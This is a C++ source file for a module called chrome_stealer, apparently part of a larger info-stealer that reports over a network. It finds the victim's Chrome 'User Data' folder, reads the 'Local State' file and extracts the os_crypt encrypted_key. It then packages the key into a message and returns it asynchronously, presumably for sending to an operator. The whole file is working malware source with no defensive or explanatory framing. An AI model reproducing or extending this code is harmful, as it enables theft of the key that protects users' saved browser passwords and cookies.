#include "chrome_stealer.h"

#include <filesystem>
#include <fstream>
#include <shlobj_core.h>

#include "net.h"

#include "messages/text_message.h"
#include "messages/error_message.h"

namespace fs = std::filesystem;

net::expected<fs::path> get_browser_path()
{
    TCHAR appdata_path[MAX_PATH];

    if(!SUCCEEDED(SHGetFolderPath(nullptr,
                                 CSIDL_LOCAL_APPDATA,
                                 nullptr,
                                 0,
                                 appdata_path)))
    {
        return net::error_t("Chrome(ERROR): Cant get path SHGetFolderPath");
    }

    return fs::path(appdata_path) / "Google" / "Chrome" / "User Data";
}

net::expected<std::string> get_encryption_key(const fs::path& browser_path)
{
    fs::path local_state_path = browser_path / "Local State";

    std::ifstream local_state_file{};
    local_state_file.open(local_state_path.string(), std::ios::binary | std::ios::in);
    if(!local_state_file.is_open())
    {
        return net::error_t("Chrome(ERROR): cant get local state for chrome");
    }

    std::string content{
        std::istreambuf_iterator<char>(local_state_file),
        std::istreambuf_iterator<char>()};

    auto jcontent = json::parse(content);
    std::string encryption_key = jcontent.at("os_crypt").at("encrypted_key").as_string().c_str();

    return encryption_key;
}

asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
{
        return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
        [](auto completion_handler)
        {
            std::thread([](auto completion_handler)
            {
                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto browser_path, get_browser_path());

                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(std::string encryption_key, get_encryption_key(browser_path));
                DLOG("Chrome(DISPLAY): Encryption key received");

                auto text_msg = std::make_unique<text_message_t>();
                text_msg->text = encryption_key;
                std::move(completion_handler)(std::move(text_msg));
            }, std::move(completion_handler)).detach();
        }, asio::use_awaitable
    );
}
